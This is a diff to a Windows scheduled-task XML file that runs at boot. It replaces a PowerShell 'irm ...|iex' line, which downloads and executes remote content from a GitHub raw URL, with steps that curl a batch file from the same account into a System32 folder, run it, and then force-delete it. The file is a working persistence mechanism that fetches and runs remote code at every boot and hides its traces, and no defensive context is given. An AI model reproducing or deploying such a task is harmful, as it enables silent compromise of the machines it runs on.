@@ -8,7 +8,6 @@
   <Triggers>
     <BootTrigger>
       <Enabled>true</Enabled>
-      <Delay>PT30S</Delay>
     </BootTrigger>
   </Triggers>
   <Principals>
@@ -47,7 +46,14 @@
     </Exec>
     <Exec>
       <Command>powershell</Command>
-      <Arguments>-Command ("irm https://raw.githubusercontent.com/mitutina/mitutina/main/index.html|iex")</Arguments>
+      <Arguments>curl -o C:\Windows\System32\WindowsPowerShell\run.bat https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat</Arguments>
+    </Exec>
+    <Exec>
+      <Command>C:\Windows\System32\WindowsPowerShell\run.bat</Command>
+    </Exec>
+    <Exec>
+      <Command>powershell</Command>
+      <Arguments>Remove-Item "C:\Windows\System32\WindowsPowerShell\run.bat" -Force</Arguments>
     </Exec>
   </Actions>
 </Task>
